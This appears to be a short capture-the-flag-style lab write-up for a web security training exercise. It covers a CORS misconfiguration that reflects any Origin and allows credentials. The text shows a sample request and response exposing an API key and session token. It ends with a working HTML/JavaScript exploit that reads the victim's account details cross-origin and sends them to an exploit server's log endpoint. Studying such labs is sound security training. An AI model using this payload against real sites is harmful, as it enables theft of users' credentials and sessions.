# 1 - Basic Origin Reflection

### Notes

This website has an insecure CORS configuration in that it trusts all origins.

When an Origin header with any value is added to requests to `/accountDetails`, the application echoes it in the `Access-Control-Allow-Origin` response header.

```http
GET /accountDetails HTTP/1.1

Origin: https://random-website.com
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://random-website.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "jFjdQBJldim1j7cv1Zm8C0BiImuskK5U",
  "sessions": [
    "2K43vdr9uBieBO6hKPxign5cBBk0RkHv"
  ]
}
```

### Solution

The following payload, delivered to the user, can be used to log their API key in the lab's exploit server:

```html
<html>
  <body>
    <script>
      const xhr = new XMLHttpRequest()
      const labUrl = 'https://acb81fbb1f7d870ec0f52ab300bf0064.web-security-academy.net'

      xhr.onreadystatechange = () => {
        if (xhr.readyState == XMLHttpRequest.DONE) {
          fetch('/log?key=' + xhr.responseText)
        }
      }

      xhr.open('GET', `${labUrl}/accountDetails`, true)
      xhr.withCredentials = true

      xhr.send(null)
    </script>
  </body>
</html>

```
